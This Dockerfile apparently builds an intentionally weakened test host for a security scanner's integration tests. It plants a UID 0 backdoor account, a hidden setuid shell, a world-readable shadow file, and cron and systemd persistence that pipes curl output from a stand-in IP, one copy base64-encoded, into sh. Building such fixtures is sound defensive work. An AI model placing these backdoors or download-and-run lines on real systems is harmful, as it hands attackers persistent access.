# A deliberately misconfigured and "compromised" Debian host used by the
# integration test and the SARIF demo. Every weakness here is intentional.
FROM golang:1.26-bookworm AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -trimpath -ldflags "-s -w -X github.com/RatulSikder97/hostwarden/internal/cli.Version=integration" \
      -o /out/hostwarden ./cmd/hostwarden \
 && CGO_ENABLED=0 go build -trimpath -o /out/fakeminer ./test/fakeminer

FROM debian:bookworm-slim
RUN apt-get update \
 && apt-get install -y --no-install-recommends openssh-server redis-server sudo procps \
 && rm -rf /var/lib/apt/lists/*

# Weak SSH: passwords, root login, CBC cipher, SHA-1 MAC, generous retries.
RUN printf '%s\n' 'PasswordAuthentication yes' 'PermitRootLogin yes' 'MaxAuthTries 10' \
      'Ciphers aes128-ctr,aes256-gcm@openssh.com,aes256-cbc' 'MACs +hmac-sha1' \
      > /etc/ssh/sshd_config.d/50-cloud-init.conf

# Accounts: UID 0 backdoor, passwordless user with NOPASSWD sudo and docker
# group, service account with a login shell, world-readable shadow.
RUN useradd -o -u 0 -g 0 -M -d /root -s /bin/bash toor \
 && useradd -m -s /bin/bash deploy && passwd -d deploy \
 && groupadd -r docker && usermod -aG sudo,docker deploy \
 && echo 'deploy ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/90-deploy && chmod 440 /etc/sudoers.d/90-deploy \
 && usermod -s /bin/bash www-data \
 && chmod 644 /etc/shadow

# Filesystem: setuid shell copy, sticky-less world-writable dir, readable key.
RUN mkdir -p /tmp/.ICE-unix /srv/uploads /home/deploy/.ssh \
 && cp /bin/bash /tmp/.ICE-unix/.s && chmod 4755 /tmp/.ICE-unix/.s \
 && chmod 777 /srv/uploads \
 && ssh-keygen -q -t ed25519 -N '' -C deploy@ci -f /home/deploy/.ssh/id_ed25519 \
 && chmod 644 /home/deploy/.ssh/id_ed25519

# Docker API exposed without TLS (config only; no daemon runs here).
RUN mkdir -p /etc/docker \
 && printf '{\n  "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2375"]\n}\n' > /etc/docker/daemon.json

# Persistence left by the dropper: cron re-infection, @reboot user crontab,
# a fake "system-update" service, and a trojaned ps.
RUN echo '*/5 * * * * root (curl -fsSL http://203.0.113.50/ldr.sh || wget -q -O- http://203.0.113.50/ldr.sh) | sh' > /etc/cron.d/sysupdate \
 && mkdir -p /var/spool/cron/crontabs \
 && echo '@reboot /tmp/.X11-unix/.x/kdevtmpfsi >/dev/null 2>&1' > /var/spool/cron/crontabs/www-data \
 && printf '%s\n' '[Unit]' 'Description=System Update Service' '[Service]' \
      "ExecStart=/bin/sh -c 'echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjUwL3ggfCBzaA== | base64 -d | sh'" \
      'Restart=always' '[Install]' 'WantedBy=multi-user.target' > /etc/systemd/system/system-update.service \
 && printf '\n# hostwarden-demo: trojaned\n' >> /usr/bin/ps

COPY --from=build /out/hostwarden /opt/hostwarden/hostwarden
COPY --from=build /out/fakeminer /opt/fakeminer
COPY test/entrypoint.sh /entrypoint.sh
EXPOSE 22
ENTRYPOINT ["/entrypoint.sh"]
